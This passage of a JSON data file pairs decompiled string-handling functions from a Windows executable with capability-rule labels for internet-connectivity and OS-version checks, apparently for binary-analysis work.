        "decompiled_code": "\nint64_t * fcn.14006cbb0(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    piVar1 = fcn.14006cc20(*arg1 + arg3, arg1[1]);\n    iVar3 = *arg1;\n    piVar2 = piVar1 + 3;\n    if (iVar3 != 0) {\n        if (iVar3 == 1) {\n            *(piVar1 + 3) = *(arg1 + 3);\n        }\n        else {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1 + 3, iVar3 * 2);\n            iVar3 = *arg1;\n        }\n    }\n    *piVar1 = iVar3;\n    *(piVar1 + 2) = 0;\n    *(piVar1 + iVar3 * 2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 232
    },
    "14006cc2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.14006cc20(uint64_t arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    char *arg1_00;\n    int64_t iVar3;\n    \n    if (arg1 < 0x1ffffffffffffffd) {\n        if (arg2 < arg1) {\n            if (arg1 < arg2 * 2) {\n                arg1 = arg2 * 2;\n            }\n            iVar2 = arg1 * 2 + 0x1a;\n            uVar1 = arg1 * 2 + 0x3a;\n            if ((uVar1 < 0x1001) || (arg1 <= arg2)) {\n                if (-1 < iVar2) goto code_r0x00014006cc89;\n                fcn.1400b6f80();\n                goto code_r0x00014006ccaa;\n            }\n            arg1 = arg1 + (0x1000 - (uVar1 & 0xfff) >> 1);\n            if (0x1ffffffffffffffc < arg1) {\n                arg1 = 0x1ffffffffffffffc;\n            }\n        }\n        iVar2 = arg1 * 2 + 0x1a;\ncode_r0x00014006cc89:\n        iVar2 = fcn.1400b6520(iVar2);\n        *(iVar2 + 8) = arg1;\n        *(iVar2 + 0x10) = 0;\n        return iVar2;\n    }\ncode_r0x00014006ccaa:\n    arg1_00 = \"basic_string::_S_create\";\n    fcn.1400b7170(\"basic_string::_S_create\");\n    iVar2 = *arg1_00;\n    iVar3 = *(iVar2 + -0x18) + -1;\n    if ((*(iVar2 + -8) < 0) || (*(iVar2 + -0x18) == 0)) {\n        return iVar2 + iVar3 * 2;\n    }\n    if (**0x140102a70 == 0) {\n        if (*(iVar2 + -8) < 1) goto code_r0x00014006cd05;\n    }\n    else if (*(iVar2 + -8) < 1) {\n        iVar2 = *arg1_00;\n        goto code_r0x00014006cd05;\n    }\n    fcn.14006e550(arg1_00, 0, 0, 0);\n    iVar2 = *arg1_00;\ncode_r0x00014006cd05:\n    *(iVar2 + -8) = 0xffffffff;\n    return iVar2 + iVar3 * 2;\n}\n",
        "token_count": 589
    },
    "14006e55": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14006e550(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t arg2_00;\n    ushort *puVar7;\n    int64_t iVar8;\n    uint64_t arg1_00;\n    \n    piVar1 = *0x140102a70;\n    iVar8 = *arg1;\n    iVar2 = arg3 + arg2;\n    arg2_00 = *(iVar8 + -0x10);\n    arg1_00 = (arg4 - arg3) + *(iVar8 + -0x18);\n    iVar5 = *(iVar8 + -0x18) - iVar2;\n    if (arg1_00 <= arg2_00) {\n        if (**0x140102a70 == 0) {\n            if (*(iVar8 + -8) < 1) {\ncode_r0x00014006e693:\n                if ((iVar5 != 0) && (arg4 != arg3)) {\n                    puVar7 = iVar8 + iVar2 * 2;\n                    puVar3 = iVar8 + (arg4 + arg2) * 2;\n                    if (iVar5 == 1) {\n                        *puVar3 = *puVar7;\n                    }\n                    else {\n                        sub.msvcrt.dll_memmove(puVar3, puVar7, iVar5 * 2);\n                        iVar8 = *arg1;\n                    }\n                }\n                goto code_r0x00014006e614;\n            }\n        }\n        else {\n            if (*(iVar8 + -8) < 1) {\n                iVar8 = *arg1;\n                goto code_r0x00014006e693;\n            }\n            arg2_00 = *(*arg1 + -0x10);\n        }\n    }\n    iVar6 = fcn.14006cc20(arg1_00, arg2_00);\n    puVar7 = *arg1;\n    iVar8 = iVar6 + 0x18;\n    if (arg2 == 0) {\ncode_r0x00014006e5f7:\n        if (iVar5 == 0) goto code_r0x00014006e5fc;\ncode_r0x00014006e640:\n        puVar3 = iVar6 + 0x18 + (arg4 + arg2) * 2;\n        if (iVar5 == 1) {\n            *puVar3 = puVar7[iVar2];\n            goto code_r0x00014006e5fc;\n        }\n        sub.msvcrt.dll_memcpy(puVar3, puVar7 + iVar2, iVar5 * 2);\n        puVar7 = *arg1;\n        if (*piVar1 != 0) goto code_r0x00014006e66d;\ncode_r0x00014006e604:\n        iVar4 = *(puVar7 + -4);\n        *(puVar7 + -4) = iVar4 + -1;\n    }\n    else {\n        if (arg2 != 1) {\n            sub.msvcrt.dll_memcpy(iVar8, puVar7, arg2 * 2);\n            puVar7 = *arg1;\n            goto code_r0x00014006e5f7;\n        }\n        *(iVar6 + 0x18) = *puVar7;\n        if (iVar5 != 0) goto code_r0x00014006e640;\ncode_r0x00014006e5fc:\n        if (*piVar1 == 0) goto code_r0x00014006e604;\ncode_r0x00014006e66d:\n        LOCK();\n        piVar1 = puVar7 + -4;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        fcn.1400b64d0(puVar7 + -0xc);\n    }\n    *arg1 = iVar8;\ncode_r0x00014006e614:\n    *(iVar8 + -8) = 0;\n    *(iVar8 + -0x18) = arg1_00;\n    *(iVar8 + arg1_00 * 2) = 0;\n    return;\n}\n",
        "token_count": 964
    },
    "14006d03": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14006d030(int64_t *arg1, ushort *arg2, uint64_t arg3)\n\n{\n    int32_t *piVar1;\n    uint64_t uVar2;\n    ushort *puVar3;\n    ushort *puVar4;\n    int64_t iVar5;\n    int64_t *arg1_00;\n    int64_t iVar6;\n    ulong *puVar7;\n    int64_t iVar8;\n    \n    if (arg3 == 0) {\n        return arg1;\n    }\n    puVar4 = *arg1;\n    puVar7 = *(puVar4 + -0xc);\n    if (0x1ffffffffffffffcU - puVar7 < arg3) {\n        arg1_00 = 0x1400fda7e;\n        fcn.1400b7170(0x1400fda7e);\n        puVar4 = *puVar7;\n        iVar8 = *(puVar4 + -0xc);\n        if (iVar8 == 0) {\n            return arg1_00;\n        }\n        iVar5 = *arg1_00;\n        iVar6 = *(iVar5 + -0x18);\n        uVar2 = iVar6 + iVar8;\n        if (uVar2 <= *(iVar5 + -0x10)) {\n            if (**0x140102a70 == 0) {\n                if (*(iVar5 + -8) < 1) goto code_r0x00014006d180;\n            }\n            else if (*(iVar5 + -8) < 1) {\n                iVar5 = *arg1_00;\n                puVar4 = *puVar7;\n                iVar6 = *(iVar5 + -0x18);\n                goto code_r0x00014006d180;\n            }\n        }\n        fcn.14006e440(arg1_00, uVar2);\n        iVar5 = *arg1_00;\n        puVar4 = *puVar7;\n        iVar6 = *(iVar5 + -0x18);\ncode_r0x00014006d180:\n        puVar3 = iVar5 + iVar6 * 2;\n        if (iVar8 == 1) {\n            *puVar3 = *puVar4;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3, puVar4, iVar8 * 2);\n            iVar5 = *arg1_00;\n        }\n        *(iVar5 + -8) = 0;\n        *(iVar5 + -0x18) = uVar2;\n        *(iVar5 + uVar2 * 2) = 0;\n        return arg1_00;\n    }\n    uVar2 = arg3 + puVar7;\n    if (*(puVar4 + -8) < uVar2) {\ncode_r0x00014006d071:\n        if ((arg2 < puVar4) || (puVar4 + *(puVar4 + -0xc) < arg2)) {\n            fcn.14006e440(arg1, uVar2);\n            puVar4 = *arg1;\n            puVar7 = *(puVar4 + -0xc);\ncode_r0x00014006d095:\n            puVar3 = puVar4 + puVar7;\n            goto joined_r0x00014006d0f0;\n        }\n        iVar8 = arg2 - puVar4;\n        fcn.14006e440(arg1, uVar2);\n        puVar4 = *arg1;\n        arg2 = iVar8 + puVar4;\n    }\n    else {\n        if (**0x140102a70 == 0) {\n            if (0 < *(puVar4 + -4)) goto code_r0x00014006d071;\n            goto code_r0x00014006d095;\n        }\n        piVar1 = puVar4 + -4;\n        puVar4 = *arg1;\n        if (0 < *piVar1) goto code_r0x00014006d071;\n    }\n    puVar3 = puVar4 + *(puVar4 + -0xc);\njoined_r0x00014006d0f0:\n    if (arg3 == 1) {\n        *puVar3 = *arg2;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar3, arg2, arg3 * 2);\n        puVar4 = *arg1;\n    }\n    *(puVar4 + -4) = 0;\n    *(puVar4 + -0xc) = uVar2;\n    puVar4[uVar2] = 0;\n    return arg1;\n}\n",
        "token_count": 1003
    },
    "14006d14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14006d140(int64_t *arg1, ulong *arg2)\n\n{\n    uint64_t arg2_00;\n    ushort *puVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ushort *puVar5;\n    \n    puVar5 = *arg2;\n    iVar2 = *(puVar5 + -0xc);\n    if (iVar2 == 0) {\n        return arg1;\n    }\n    iVar3 = *arg1;\n    iVar4 = *(iVar3 + -0x18);\n    arg2_00 = iVar4 + iVar2;\n    if (arg2_00 <= *(iVar3 + -0x10)) {\n        if (**0x140102a70 == 0) {\n            if (*(iVar3 + -8) < 1) goto code_r0x00014006d180;\n        }\n        else if (*(iVar3 + -8) < 1) {\n            iVar3 = *arg1;\n            puVar5 = *arg2;\n            iVar4 = *(iVar3 + -0x18);\n            goto code_r0x00014006d180;\n        }\n    }\n    fcn.14006e440(arg1, arg2_00);\n    iVar3 = *arg1;\n    puVar5 = *arg2;\n    iVar4 = *(iVar3 + -0x18);\ncode_r0x00014006d180:\n    puVar1 = iVar3 + iVar4 * 2;\n    if (iVar2 == 1) {\n        *puVar1 = *puVar5;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar1, puVar5, iVar2 * 2);\n        iVar3 = *arg1;\n    }\n    *(iVar3 + -8) = 0;\n    *(iVar3 + -0x18) = arg2_00;\n    *(iVar3 + arg2_00 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 440
    },
    "14006d30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t ** fcn.14006d300(int64_t **arg1, uint64_t arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    ushort *puVar2;\n    int64_t *piVar3;\n    uint64_t uVar4;\n    int64_t **ppiVar5;\n    int64_t **ppiVar6;\n    \n    if (arg2 == 0) {\n        return arg1;\n    }\n    ppiVar6 = *arg1;\n    piVar3 = ppiVar6[-3];\n    if (0x1ffffffffffffffcU - piVar3 < arg2) {\n        ppiVar5 = 0x1400fda7e;\n        fcn.1400b7170(0x1400fda7e);\n        piVar3 = *ppiVar5;\n        if (*(piVar3 + -1) < 0) {\n            *(piVar3 + -1) = 0;\n        }\n        piVar1 = *ppiVar6;\n        if (*(piVar1 + -1) < 0) {\n            *(piVar1 + -1) = 0;\n        }\n        *ppiVar5 = piVar1;\n        *ppiVar6 = piVar3;\n        return ppiVar5;\n    }\n    piVar1 = arg2 + piVar3;\n    if (piVar1 <= ppiVar6[-2]) {\n        if (**0x140102a70 == 0) {\n            if (*(ppiVar6 + -1) < 1) goto code_r0x00014006d36e;\n        }\n        else if (*(ppiVar6 + -1) < 1) {\n            ppiVar6 = *arg1;\n            piVar3 = ppiVar6[-3];\n            goto code_r0x00014006d36e;\n        }\n    }\n    fcn.14006e440(arg1, piVar1);\n    ppiVar6 = *arg1;\n    piVar3 = ppiVar6[-3];\ncode_r0x00014006d36e:\n    puVar2 = ppiVar6 + piVar3 * 2;\n    uVar4 = 0;\n    if (arg2 == 1) {\n        *puVar2 = arg3;\n    }\n    else {\n        do {\n            puVar2[uVar4] = arg3;\n            uVar4 = uVar4 + 1;\n        } while (arg2 != uVar4);\n    }\n    *(ppiVar6 + -1) = 0;\n    ppiVar6[-3] = piVar1;\n    *(ppiVar6 + piVar1 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 594
    },
    "14006d45": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t ** fcn.14006d450(int64_t **arg1, int64_t **arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    int32_t *piVar4;\n    int64_t *piVar5;\n    int64_t **ppiVar6;\n    uchar auStack81 [9];\n    int64_t *piStack72;\n    int64_t **ppiStack64;\n    \n    ppiVar6 = *arg1;\n    piVar5 = ppiVar6[-3];\n    if (0x1ffffffffffffffc < arg3) {\n        ppiVar6 = 0x1400fda69;\n        ppiStack64 = 0x14006d5a7;\n        fcn.1400b7170(0x1400fda69);\n        piVar4 = *0x140102a70;\n        piVar5 = *arg2;\n        if (*ppiVar6 != piVar5) {\n            piStack72 = arg3;\n            ppiStack64 = arg1;\n            if (*(piVar5 + -1) < 0) {\n                piVar5 = fcn.14006cbb0(piVar5 + -3, &stack0xffffffffffffffaf, 0);\n                piVar3 = *ppiVar6;\n                iVar2 = **0x140102a70;\n            }\n            else {\n                if (**0x140102a70 == 0) {\n                    *(piVar5 + -1) = *(piVar5 + -1) + 1;\n                }\n                else {\n                    LOCK();\n                    *(piVar5 + -1) = *(piVar5 + -1) + 1;\n                }\n                iVar2 = *piVar4;\n                piVar3 = *ppiVar6;\n            }\n            if (iVar2 == 0) {\n                iVar2 = *(piVar3 + -1);\n                *(piVar3 + -1) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = piVar3 + -1;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                fcn.1400b64d0(piVar3 + -3);\n            }\n            *ppiVar6 = piVar5;\n            return ppiVar6;\n        }\n        return ppiVar6;\n    }\n    if ((arg2 < ppiVar6) || (ppiVar6 + piVar5 * 2 < arg2)) {\ncode_r0x00014006d510:\n        ppiStack64 = 0x14006d51d;\n        fcn.14006e550(arg1, 0, piVar5, arg3);\n        if (arg3 == NULL) {\n            return arg1;\n        }\n        if (arg3 == 0x1) {\n            **arg1 = *arg2;\n            return arg1;\n        }\n        ppiStack64 = 0x14006d537;\n        sub.msvcrt.dll_memcpy(*arg1, arg2, arg3 * 2);\n        return arg1;\n    }\n    if (**0x140102a70 == 0) {\n        if (0 < *(ppiVar6 + -1)) goto code_r0x00014006d510;\n    }\n    else {\n        if (0 < *(ppiVar6 + -1)) {\n            piVar5 = (*arg1)[-3];\n            goto code_r0x00014006d510;\n        }\n        ppiVar6 = *arg1;\n    }\n    piVar5 = arg2 - ppiVar6 >> 1;\n    if (piVar5 < arg3) {\n        if (piVar5 == NULL) goto code_r0x00014006d4e0;\n        if (arg3 != 0x1) {\n            ppiStack64 = 0x14006d4d3;\n            sub.msvcrt.dll_memmove(ppiVar6, arg2);\n            ppiVar6 = *arg1;\n            goto code_r0x00014006d4e0;\n        }\n    }\n    else if (arg3 != 0x1) {\n        if (arg3 != NULL) {\n            ppiStack64 = 0x14006d577;\n            sub.msvcrt.dll_memcpy(ppiVar6, arg2, arg3 * 2);\n            ppiVar6 = *arg1;\n        }\n        goto code_r0x00014006d4e0;\n    }\n    *ppiVar6 = *arg2;\ncode_r0x00014006d4e0:\n    *(ppiVar6 + -1) = 0;\n    ppiVar6[-3] = arg3;\n    *(ppiVar6 + arg3 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 1077
    },
    "14006dc4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t ** fcn.14006dc40(int64_t **arg1, int64_t **arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    ushort *puVar3;\n    ushort *puVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int64_t *piVar8;\n    int64_t iVar9;\n    int64_t **ppiVar10;\n    int64_t iVar11;\n    int64_t **ppiVar12;\n    char *pcVar13;\n    uint64_t uVar14;\n    int64_t *piVar15;\n    uint64_t uVar16;\n    int64_t in_R8;\n    \n    piVar7 = *0x140102a70;\n    ppiVar10 = (*arg1)[-3];\n    if (0x1ffffffffffffffc < arg2) {\n        pcVar13 = \"basic_string::resize\";\n        ppiVar10 = fcn.1400b7170(\"basic_string::resize\");\n        if (in_R8 == 1) {\n            uVar5 = *arg2;\n            *pcVar13 = uVar5;\n            return uVar5;\n        }\n        if (in_R8 != 0) {\n    // WARNING: Could not recover jumptable at 0x000140018630. Too many branches\n    // WARNING: Treating indirect jump as call\n            ppiVar10 = (*_sym.imp.msvcrt.dll_memcpy)();\n            return ppiVar10;\n        }\n        return ppiVar10;\n    }\n    if (ppiVar10 < arg2) {\n        uVar14 = arg2 - ppiVar10;\n        if (uVar14 == 0) {\n            return arg1;\n        }\n        ppiVar10 = *arg1;\n        piVar8 = ppiVar10[-3];\n        if (0x1ffffffffffffffcU - piVar8 < uVar14) {\n            ppiVar12 = 0x1400fda7e;\n            fcn.1400b7170(0x1400fda7e);\n            piVar8 = *ppiVar12;\n            if (*(piVar8 + -1) < 0) {\n                *(piVar8 + -1) = 0;\n            }\n            piVar15 = *ppiVar10;\n            if (*(piVar15 + -1) < 0) {\n                *(piVar15 + -1) = 0;\n            }\n            *ppiVar12 = piVar15;\n            *ppiVar10 = piVar8;\n            return ppiVar12;\n        }\n        piVar15 = uVar14 + piVar8;\n        if (piVar15 <= ppiVar10[-2]) {\n            if (**0x140102a70 == 0) {\n                if (*(ppiVar10 + -1) < 1) goto code_r0x00014006d36e;\n            }\n            else if (*(ppiVar10 + -1) < 1) {\n                ppiVar10 = *arg1;\n                piVar8 = ppiVar10[-3];\n                goto code_r0x00014006d36e;\n            }\n        }\n        fcn.14006e440(arg1, piVar15);\n        ppiVar10 = *arg1;\n        piVar8 = ppiVar10[-3];\ncode_r0x00014006d36e:\n        puVar3 = ppiVar10 + piVar8 * 2;\n        uVar16 = 0;\n        if (uVar14 == 1) {\n            *puVar3 = in_R8;\n        }\n        else {\n            do {\n                puVar3[uVar16] = in_R8;\n                uVar16 = uVar16 + 1;\n            } while (uVar14 != uVar16);\n        }\n        *(ppiVar10 + -1) = 0;\n        ppiVar10[-3] = piVar15;\n        *(ppiVar10 + piVar15 * 2) = 0;\n        return arg1;\n    }\n    if (ppiVar10 <= arg2) {\n        return ppiVar10;\n    }\n    iVar9 = ppiVar10 - arg2;\n    piVar8 = *arg1;\n    iVar2 = iVar9 + arg2;\n    uVar14 = piVar8[-2];\n    uVar16 = piVar8[-3] - iVar9;\n    iVar11 = piVar8[-3] - iVar2;\n    if (uVar16 <= uVar14) {\n        if (**0x140102a70 == 0) {\n            if (*(piVar8 + -1) < 1) {\ncode_r0x00014006e693:\n                if ((iVar11 != 0) && (iVar9 != 0)) {\n                    puVar3 = piVar8 + iVar2 * 2;\n                    puVar4 = piVar8 + arg2 * 2;\n                    if (iVar11 == 1) {\n                        *puVar4 = *puVar3;\n                    }\n                    else {\n                        sub.msvcrt.dll_memmove(puVar4, puVar3, iVar11 * 2);\n                        piVar8 = *arg1;\n                    }\n                }\n                goto code_r0x00014006e614;\n            }\n        }\n        else {\n            if (*(piVar8 + -1) < 1) {\n                piVar8 = *arg1;\n                goto code_r0x00014006e693;\n            }\n            uVar14 = (*arg1)[-2];\n        }\n    }\n    iVar9 = fcn.14006cc20(uVar16, uVar14);\n    piVar15 = *arg1;\n    piVar8 = iVar9 + 0x18;\n    if (arg2 == NULL) {\ncode_r0x00014006e5f7:\n        if (iVar11 == 0) goto code_r0x00014006e5fc;\ncode_r0x00014006e640:\n        puVar3 = piVar15 + iVar2 * 2;\n        puVar4 = iVar9 + 0x18 + arg2 * 2;\n        if (iVar11 == 1) {\n            *puVar4 = *puVar3;\n            goto code_r0x00014006e5fc;\n        }\n        sub.msvcrt.dll_memcpy(puVar4, puVar3, iVar11 * 2);\n        piVar15 = *arg1;\n        if (*piVar7 == 0) goto code_r0x00014006e604;\ncode_r0x00014006e66d:\n        LOCK();\n        piVar1 = piVar15 + -1;\n        iVar6 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    else {\n        if (arg2 != 0x1) {\n            sub.msvcrt.dll_memcpy(piVar8, piVar15, arg2 * 2);\n            piVar15 = *arg1;\n            goto code_r0x00014006e5f7;\n        }\n        *(iVar9 + 0x18) = *piVar15;\n        if (iVar11 != 0) goto code_r0x00014006e640;\ncode_r0x00014006e5fc:\n        if (*piVar7 != 0) goto code_r0x00014006e66d;\ncode_r0x00014006e604:\n        iVar6 = *(piVar15 + -1);\n        *(piVar15 + -1) = iVar6 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.1400b64d0(piVar15 + -3);\n    }\n    *arg1 = piVar8;\ncode_r0x00014006e614:\n    *(piVar8 + -1) = 0;\n    piVar8[-3] = uVar16;\n    *(piVar8 + uVar16 * 2) = 0;\n    return NULL;\n}\n",
        "token_count": 1749
    },
    "14006e03": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14006e030(int64_t *arg1, ulong *arg2, uint64_t arg3, ushort *arg4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    ulong arg1_00;\n    int64_t *piVar4;\n    ushort *puVar5;\n    ulong *arg4_00;\n    uint64_t arg3_00;\n    int64_t iVar6;\n    ulong unaff_R15;\n    uint64_t in_stack_00000028;\n    \n    piVar1 = *0x140102a70;\n    puVar3 = *arg1;\n    arg4_00 = *(puVar3 + -0xc);\n    if (arg4_00 < arg2) {\ncode_r0x00014006e25c:\n        arg1_00 = fcn.1400b1a60(0x1400fd950, 0x1400fda53, arg2, arg4_00);\n        fcn.14006caa0(arg4 + -0xc);\n        fcn.14000f000(arg1_00);\n        piVar4 = fcn.14006e030(arg1_00, unaff_R15, arg2, *arg4_00);\n        return piVar4;\n    }\n    arg3_00 = arg4_00 - arg2;\n    if (arg3 < arg4_00 - arg2) {\n        arg3_00 = arg3;\n    }\n    if ((0x1ffffffffffffffc - arg4_00) + arg3_00 < in_stack_00000028) {\n        fcn.1400b7170(0x1400fda53);\n        goto code_r0x00014006e25c;\n    }\n    if ((arg4 < puVar3) || (puVar3 + arg4_00 < arg4)) {\ncode_r0x00014006e150:\n        fcn.14006e550(arg1, arg2, arg3_00, in_stack_00000028);\n        if (in_stack_00000028 != 0) {\n            puVar3 = *arg1 + arg2 * 2;\n            if (in_stack_00000028 == 1) {\n                *puVar3 = *arg4;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(puVar3, arg4, in_stack_00000028 * 2);\n            }\n        }\n    }\n    else {\n        if (**0x140102a70 == 0) {\n            if (0 < *(puVar3 + -4)) goto code_r0x00014006e150;\n        }\n        else {\n            if (0 < *(puVar3 + -4)) goto code_r0x00014006e150;\n            puVar3 = *arg1;\n        }\n        if (puVar3 + arg2 < arg4 + in_stack_00000028) {\n            if (arg4 < puVar3 + arg2 + arg3_00) {\n                puVar3 = fcn.14006c530(arg4, arg4 + in_stack_00000028);\n                fcn.14006e550(arg1, arg2, arg3_00, in_stack_00000028);\n                if (in_stack_00000028 != 0) {\n                    puVar5 = arg2 * 2 + *arg1;\n                    if (in_stack_00000028 == 1) {\n                        *puVar5 = *puVar3;\n                    }\n                    else {\n                        sub.msvcrt.dll_memcpy(puVar5, puVar3, in_stack_00000028 * 2);\n                    }\n                }\n                if (*piVar1 == 0) {\n                    iVar2 = *(puVar3 + -4);\n                    *(puVar3 + -4) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = puVar3 + -4;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (0 < iVar2) {\n                    return arg1;\n                }\n                fcn.1400b64d0(puVar3 + -0xc);\n                return arg1;\n            }\n            iVar6 = (in_stack_00000028 - arg3_00) + (arg4 - puVar3 >> 1);\n        }\n        else {\n            iVar6 = arg4 - puVar3 >> 1;\n        }\n        fcn.14006e550(arg1, arg2, arg3_00, in_stack_00000028);\n        puVar3 = *arg1 + iVar6 * 2;\n        puVar5 = *arg1 + arg2 * 2;\n        if (in_stack_00000028 